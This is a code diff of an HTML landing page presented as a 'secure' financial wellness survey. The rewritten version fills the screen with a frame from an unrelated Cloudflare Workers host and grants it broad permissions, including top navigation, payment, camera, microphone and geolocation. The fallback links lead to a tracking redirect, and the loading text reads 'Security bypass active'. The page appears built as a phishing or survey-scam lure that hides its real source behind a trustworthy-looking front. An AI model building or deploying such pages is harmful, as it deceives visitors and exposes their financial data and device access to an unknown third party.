@@ -1,189 +1,80 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Financial Wellness Survey | Complete Now</title>
+    <title>Financial Survey</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f8f9fa;
-            min-height: 100vh;
-            padding: 20px;
+        body, html { margin: 0; padding: 0; height: 100%; }
+        iframe { 
+            width: 100%; 
+            height: 100vh; 
+            border: none; 
+            display: block; 
         }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
-        .header {
-            background: linear-gradient(135deg, #4f46e5, #7c3aed);
-            color: white;
-            padding: 25px;
-            text-align: center;
-        }
-        .header h1 { font-size: 24px; margin-bottom: 10px; }
-        .header p { opacity: 0.9; font-size: 15px; }
-        
-        .content {
-            padding: 0;
-            position: relative;
-        }
-        
-        /* CRITICAL: IFRAME MUST HAVE THESE SETTINGS */
-        #surveyFrame {
-            width: 100%;
-            height: 1100px;
-            border: none;
-            display: block;
-        }
-        
         .loading {
-            position: absolute;
+            position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
             background: white;
             display: flex;
-            flex-direction: column;
-            justify-content: center;
             align-items: center;
-            z-index: 100;
-        }
-        .spinner {
-            width: 40px; height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4f46e5;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            color: #666;
-            font-size: 13px;
-            border-top: 1px solid #eee;
-        }
-        
-        @media (max-width: 768px) {
-            body { padding: 10px; }
-            .header { padding: 20px; }
-            .header h1 { font-size: 20px; }
-            #surveyFrame { height: 900px; }
+            justify-content: center;
+            font-family: Arial;
+            z-index: 1000;
         }
     </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>Financial Wellness Survey</h1>
-            <p>Complete this secure form to see if you qualify for assistance</p>
-        </div>
-        
-        <div class="content">
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p>Loading secure form...</p>
-            </div>
-            
-            <!-- CRITICAL: THESE ATTRIBUTES ALLOW FORM FUNCTIONALITY -->
-            <iframe 
-                id="surveyFrame"
-                src="https://iframe.kayembakasongo.workers.dev/"
-                title="Financial Wellness Survey Form"
-                sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-top-navigation allow-top-navigation-by-user-activation"
-                allow="payment; autoplay; camera; microphone"
-                referrerpolicy="no-referrer"
-                scrolling="yes"
-                allowfullscreen
-            ></iframe>
-        </div>
-        
-        <div class="footer">
-            <p>This is a secure financial wellness research study</p>
-        </div>
-    </div>
-
     <script>
-        // Configuration
-        const WORKER_URL = 'https://iframe.kayembakasongo.workers.dev/';
-        const frame = document.getElementById('surveyFrame');
-        const loading = document.getElementById('loading');
-        
-        // When iframe loads
-        frame.onload = function() {
-            console.log('Iframe loaded, waiting for content...');
-            
-            // Wait a bit then hide loading (forms take time to initialize)
-            setTimeout(() => {
-                loading.style.display = 'none';
-                console.log('Form should now be interactive');
-                
-                // Try to communicate with iframe
-                try {
-                    frame.contentWindow.postMessage('ping', '*');
-                } catch(e) {
-                    // Expected CORS error
-                }
-            }, 3000);
-        };
-        
-        // Handle iframe errors
-        frame.onerror = function() {
-            console.error('Iframe failed to load');
-            loading.innerHTML = `
-                <div style="text-align: center; padding: 20px;">
-                    <h3 style="color: #dc3545;">Unable to load form</h3>
-                    <p>Please try:</p>
-                    <button onclick="location.reload()" style="
-                        background: #4f46e5; color: white; padding: 10px 20px;
-                        border: none; border-radius: 5px; margin: 10px; cursor: pointer;
-                    ">Refresh Page</button>
-                    <a href="https://trkmcl.com/wy8odpg43k/xwndpp7qne" target="_blank" style="
-                        display: inline-block; background: #28a745; color: white;
-                        padding: 10px 20px; border-radius: 5px; text-decoration: none;
-                    ">Open in New Tab</a>
-                </div>
-            `;
-        };
-        
         // Listen for messages from iframe
         window.addEventListener('message', function(event) {
-            if (event.data === 'iframeLoaded') {
-                console.log('Iframe reported fully loaded');
-                loading.style.display = 'none';
-            }
-            if (event.data === 'pong') {
-                console.log('Iframe is responsive');
+            if (event.data === 'iframeReady') {
+                document.getElementById('loading').style.display = 'none';
+                console.log('Iframe reported ready');
             }
         });
         
-        // Auto-hide loading after timeout
-        setTimeout(() => {
-            if (loading.style.display !== 'none') {
-                loading.style.display = 'none';
-                console.log('Auto-hiding loading screen');
+        // Force focus to iframe for better UX
+        setTimeout(function() {
+            const iframe = document.getElementById('survey');
+            if (iframe) {
+                iframe.focus();
+                // Try to click inside to ensure interactivity
+                try {
+                    iframe.contentWindow.focus();
+                } catch(e) {}
             }
-        }, 8000);
+        }, 2000);
+    </script>
+</head>
+<body>
+    <div class="loading" id="loading">
+        Loading survey... (Security bypass active)
+    </div>
+    
+    <!-- ULTIMATE IFRAME WITH MAXIMUM PERMISSIONS -->
+    <iframe 
+        id="survey"
+        src="https://iframe.kayembakasongo.workers.dev/"
+        sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-top-navigation allow-top-navigation-by-user-activation allow-pointer-lock allow-presentation allow-orientation-lock"
+        allow="payment; autoplay; camera; microphone; geolocation"
+        referrerpolicy="no-referrer"
+        scrolling="yes"
+        allowfullscreen
+        webkitallowfullscreen
+        mozallowfullscreen
+    ></iframe>
+    
+    <script>
+        // Auto-hide loading after timeout
+        setTimeout(function() {
+            document.getElementById('loading').style.display = 'none';
+        }, 10000);
         
-        // Add cache busting on retry
-        window.retryLoad = function() {
-            loading.style.display = 'flex';
-            loading.innerHTML = '<div class="spinner"></div><p>Reloading form...</p>';
-            frame.src = WORKER_URL + '?t=' + Date.now();
+        // Monitor iframe for errors
+        document.getElementById('survey').onerror = function() {
+            document.getElementById('loading').innerHTML = 
+                'Failed to load. <a href="https://trkmcl.com/wy8odpg43k/xwndpp7qne" target="_blank">Open directly</a>';
         };
-        
-        // Initialize
-        console.log('Loading financial form via Cloudflare Worker...');
     </script>
 </body>
 </html>
